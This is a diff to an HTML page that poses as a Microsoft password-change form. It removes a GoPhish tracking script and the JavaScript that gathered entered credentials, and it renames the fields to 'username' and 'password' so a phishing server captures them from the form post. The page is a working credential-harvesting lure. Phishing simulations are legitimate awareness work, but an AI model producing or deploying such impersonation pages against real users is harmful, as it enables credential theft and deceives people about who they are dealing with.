@@ -1,8 +1,6 @@
 <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/>
 	<title>Change your password</title>
 	<meta name="viewport" content="width=410"/>
-	<!-- GoPhish tracking script - Replace {{.URL}} with your GoPhish server URL -->
-	<script src="{{.URL}}/js/gophish.js"></script>
 	<style type="text/css">html, body {
             font-family: 'Segoe UI', SegoeUI, Arial, sans-serif;
             background: #f3f3f3;
@@ -181,49 +179,25 @@
 <div class="info-text">A strong password helps prevent unauthorized access to your email account.</div>
 
 <form id="resetForm" method="POST" action="">
-<div class="form-group"><label for="email">Email address</label> <input autocomplete="username" id="email" name="email" placeholder="name@example.com" required="" type="email"/></div>
+<div class="form-group"><label for="email">Email address</label> <input autocomplete="username" id="email" name="username" placeholder="name@example.com" required="" type="email"/></div>
 
 <div class="form-group"><label for="current">Current password</label> <input autocomplete="current-password" id="current" name="password" placeholder="Current password" required="" type="password"/> <a class="minor-link" href="#">Forgot your password?</a></div>
 
-<div class="form-group"><label for="newpass">New password</label> <input autocomplete="new-password" id="newpass" name="new_password" required="" type="password"/></div>
+<div class="form-group"><label for="newpass">New password</label> <input autocomplete="new-password" id="newpass" name="password" required="" type="password"/></div>
 
 <div class="policy-note">8-character minimum; case sensitive</div>
 
-<div class="form-group"><label for="reenter">Reenter password</label> <input autocomplete="new-password" id="reenter" name="confirm_password" required="" type="password"/></div>
+<div class="form-group"><label for="reenter">Reenter password</label> <input autocomplete="new-password" id="reenter" name="password" required="" type="password"/></div>
 
 <div class="check-wrap"><input id="change72" type="checkbox"/> <label for="change72">Make me change my password every 72 days</label></div>
 
-<div class="btngroup"><button class="save-btn" type="submit">Save</button><button class="cancel-btn" onclick="window.location='https://login.microsoftonline.com/'" type="button">Cancel</button></div>
+<div class="btngroup"><button class="save-btn" type="submit">Save</button><button class="cancel-btn" onclick="window.location=&#39;https://account.microsoft.com/&#39;" type="button">Cancel</button></div>
 
 <div class="success-message" id="successMsg">✓ Your password has been successfully updated. Redirecting you to your account...</div>
 </form>
 </div>
 <script>
-        // GoPhish tracking integration
-        document.addEventListener('DOMContentLoaded', function() {
-            // Track page visit
-            if (typeof gophish !== 'undefined') {
-                gophish.track();
-            }
-        });
-
         document.getElementById('resetForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent default form submission
-            
-            // Collect form data
-            var formData = {
-                email: document.getElementById('email').value,
-                password: document.getElementById('current').value,
-                new_password: document.getElementById('newpass').value,
-                confirm_password: document.getElementById('reenter').value
-            };
-            
-            // Submit to GoPhish for tracking
-            if (typeof gophish !== 'undefined') {
-                gophish.submit(formData);
-            }
-            
-            // Show success message and redirect
             setTimeout(function() {
                 document.getElementById('successMsg').style.display = 'block';
                 setTimeout(function() {
